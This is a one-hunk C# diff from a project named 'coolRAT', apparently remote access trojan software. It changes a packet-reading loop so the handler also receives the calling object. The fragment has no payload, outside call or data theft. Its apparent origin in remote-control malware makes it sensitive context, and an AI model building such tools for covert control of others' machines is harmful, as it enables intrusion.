@@ -26,7 +26,7 @@ namespace coolRAT.Libs
             while(!AbortLoop)
             {
                 string packet_raw = Connection.ReadPacket();
-                Task.Run(() => Handler.HandlePacket(packet_raw));
+                Task.Run(() => Handler.HandlePacket(this, packet_raw));
             }
         }
 
